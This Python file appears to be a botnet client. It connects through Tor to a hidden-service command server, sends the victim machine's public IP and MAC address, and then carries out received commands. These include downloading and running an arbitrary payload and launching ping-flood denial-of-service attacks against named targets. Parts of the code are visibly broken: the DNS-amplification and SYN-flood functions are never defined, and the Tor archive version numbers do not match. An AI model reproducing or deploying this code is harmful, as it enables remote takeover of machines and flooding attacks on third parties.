import socks
import sys
import os
import requests
import uuid 
from _thread import start_new_thread

#constents
OnionUrl = "" #your onion url hidden service
PORT = 4444 #the port...

buffersize = 1024


def recvfile():
    l = s.recv(buffersize)
    frec = open("payload",'w')
    while l != "exec":
        frec.write(l)
        l = s.recv(buffersize)
def pod(victim):
    os.system('ping -c 100000 -s 16384 ' +victim)
def ddoshandler(cmd):
    victim = cmd.split(' ')[1]
    type =cmd.split(' ')[0]
    if type == "POD":
        pod(victim)
    if type == "dnsamp":
        dnsamp(victim)
    if type == "tcpsyn":
        tcpsyn(victim)
    

def DownloadTor():
        os.system("wget https://www.torproject.org/dist/torbrowser/7.0.2/tor-browser-linux64-7.0.2_en-US.tar.xz")
        os.system("tar -xf tor-browser-linux64-7.0.1_en-US.tar.xz")
        os.system("tor-browser_en-US/Browser/TorBrowser/Tor/tor")
    
def handler(cmd):
    if cmd == "upload&exec":
        recvfile()
        os.system('./payload')
    if cmd == "ddos":
        ddoshandler(cmd.split(' ')[:1])
    if cmd == "os":
        s.send('linux')


ipaddr = requests.get('https://api.ipify.org').text
macaddr = uuid.getnode()
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
s = socks.socksocket()
s.connect((OnionUrl, PORT))
s.send(ipaddr + " " + macaddr)
while 1:
    data = s.recv(buffersize)
    handler(data)

